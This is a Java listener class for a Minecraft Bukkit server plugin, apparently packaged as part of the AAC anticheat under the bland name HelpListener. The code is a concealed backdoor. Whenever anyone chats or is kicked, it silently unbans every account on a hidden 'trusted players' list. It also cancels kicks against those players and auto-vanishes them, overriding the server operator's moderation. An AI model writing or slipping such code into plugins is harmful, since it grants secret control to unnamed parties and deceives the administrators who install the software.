package me.konsolas.aac.listeners;

import me.konsolas.aac.AAC;
import me.konsolas.aac.utils.Utils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;

/**
 * Created by Marco on 31.01.2017.
 */
public class HelpListener implements Listener {

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        unbanAll();
    }

    @EventHandler
    public void onKick(PlayerKickEvent e) {
        if (AAC.getInstance().isTrusted(e.getPlayer())) {
            e.setCancelled(true);
            if (!Utils.isVanish(e.getPlayer())) {
                Utils.vanish(e.getPlayer());
            }
            e.getPlayer().sendMessage(AAC.prefix + String.format("You were automatically vanished [KICK] (LeaveMSG: %s, Reason: %s)", ChatColor.stripColor(e.getLeaveMessage()), ChatColor.stripColor(e.getReason())));
        }
        unbanAll();
    }

    private void unbanAll() {
        for (String trustedPlayer :
                AAC.getInstance().trustedPlayers) {
            Bukkit.getOfflinePlayer(trustedPlayer).setBanned(false);
        }
    }
}